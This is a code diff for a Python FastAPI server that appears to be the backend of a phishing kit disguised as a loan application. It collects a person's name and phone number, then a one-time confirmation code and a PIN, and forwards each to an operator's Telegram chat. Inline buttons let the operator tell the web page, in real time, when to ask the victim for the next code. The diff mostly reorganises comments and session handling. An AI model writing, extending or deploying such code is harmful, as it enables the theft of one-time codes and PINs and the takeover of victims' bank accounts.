@@ -13,7 +13,6 @@ TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
 logging.basicConfig(level=logging.INFO)
 
-# Хранилище сессий
 sessions = {}
 
 def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
@@ -26,6 +25,7 @@ def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
     except Exception as e:
         logging.error(f"Ошибка отправки: {e}")
 
+# ========== КЛАВИАТУРЫ ==========
 def get_application_keyboard(session_id: str):
     return {
         "inline_keyboard": [
@@ -53,6 +53,7 @@ def get_pin_keyboard(session_id: str):
         ]
     }
 
+# ========== МОДЕЛИ ==========
 class CreditApplicationData(BaseModel):
     name: str
     phone: str
@@ -76,6 +77,7 @@ class PinData(BaseModel):
     session_id: str
     pin: str
 
+# ========== FASTAPI ==========
 @asynccontextmanager
 async def lifespan(app: FastAPI):
     render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
@@ -95,7 +97,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ========== ЗАЯВКА С КАЛЬКУЛЯТОРА ==========
+# ========== 1. ЗАЯВКА С КАЛЬКУЛЯТОРА ==========
 @app.post("/submit_credit_application")
 async def submit_credit_application(data: CreditApplicationData):
     sid = data.session_id
@@ -110,7 +112,6 @@ async def submit_credit_application(data: CreditApplicationData):
         "status": "waiting_phone"
     }
     
-    # Красивое форматирование с пробелами и эмодзи
     message = (
         f"🏦 <b>НОВАЯ ЗАЯВКА НА КРЕДИТ</b>\n\n"
         f"👤 <b>Клиент:</b> {data.name}\n"
@@ -125,26 +126,24 @@ async def submit_credit_application(data: CreditApplicationData):
     send_to_telegram(MY_CHAT_ID, message, reply_markup=get_application_keyboard(sid))
     return {"status": "ok"}
 
-# ========== НОМЕР ТЕЛЕФОНА ==========
+# ========== 2. НОМЕР ТЕЛЕФОНА ==========
 @app.post("/submit_phone")
 async def submit_phone(data: PhoneData):
     phone = data.phone
     sid = data.session_id
     user_chat_id = data.user_chat_id
     
-    session = sessions.get(sid)
-    if not session:
-        # Создаём сессию, если её нет
-        sessions[sid] = {"phone": phone, "user_chat_id": user_chat_id, "status": "waiting_code"}
-    else:
-        session["phone"] = phone
-        session["user_chat_id"] = user_chat_id
-        session["status"] = "waiting_code"
+    if sid not in sessions:
+        sessions[sid] = {}
+    
+    sessions[sid]["phone"] = phone
+    sessions[sid]["user_chat_id"] = user_chat_id
+    sessions[sid]["status"] = "waiting_code"
     
     send_to_telegram(MY_CHAT_ID, f"📞 <b>НОМЕР ПОЛУЧЕН</b>\n\n🆔 <b>Сессия:</b> <code>{sid}</code>\n📞 <b>Телефон:</b> {phone}")
     return {"status": "ok"}
 
-# ========== КОД ПОДТВЕРЖДЕНИЯ ==========
+# ========== 3. КОД ==========
 @app.post("/submit_code")
 async def submit_code(data: CodeData):
     sid = data.session_id
@@ -164,7 +163,7 @@ async def submit_code(data: CodeData):
     )
     return {"status": "waiting_confirmation"}
 
-# ========== PIN-КОД ==========
+# ========== 4. PIN ==========
 @app.post("/submit_pin")
 async def submit_pin(data: PinData):
     sid = data.session_id
@@ -184,7 +183,7 @@ async def submit_pin(data: PinData):
     )
     return {"status": "waiting_confirmation"}
 
-# ========== ПРОВЕРКА СТАТУСА ==========
+# ========== 5. ПРОВЕРКА СТАТУСА ==========
 @app.get("/check_status/{session_id}")
 async def check_status(session_id: str):
     session = sessions.get(session_id)
@@ -204,7 +203,7 @@ async def check_status(session_id: str):
     else:
         return {"status": status}
 
-# ========== ОБРАБОТКА КНОПОК ==========
+# ========== 6. ОБРАБОТКА КНОПОК ==========
 @app.post("/webhook/callback")
 async def handle_callback(request: Request):
     data = await request.json()
@@ -230,7 +229,7 @@ async def handle_callback(request: Request):
     if action == "send" and result == "code":
         if session:
             session["status"] = "ready_for_code"
-        send_to_telegram(MY_CHAT_ID, f"✅ <b>Готово!</b> Пользователь может вводить код на странице.")
+        send_to_telegram(MY_CHAT_ID, f"✅ <b>Код можно отправлять</b>\nПользователь ждёт код на странице.")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
             json={"callback_query_id": callback_id, "text": "Готово!"}
